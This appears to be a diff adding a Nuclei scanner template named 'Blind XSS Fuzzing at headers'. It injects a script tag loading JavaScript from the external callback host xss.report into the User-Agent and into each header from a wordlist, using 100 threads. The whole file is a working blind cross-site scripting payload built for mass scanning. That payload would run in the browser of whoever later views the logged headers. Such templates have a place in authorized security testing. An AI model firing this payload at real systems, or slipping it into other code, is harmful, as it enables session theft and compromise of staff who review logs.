@@ -1,0 +1,25 @@
+id: BXSS
+
+info:
+  name: Blind XSS Fuzzing at headers
+  author: abdulrahman
+  severity: high
+
+requests:
+  - raw:
+    - |
+      GET / HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: '"><script src=//xss.report/s/abdulrahman></script>
+      §header§: '"><script src=//xss.report/s/abdulrahman></script>
+
+    payloads:
+      header: /root/nuclei-templates/helpers/wordlists/headers.txt
+    
+    attack: batteringram
+    threads: 100
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "abdulrahman"
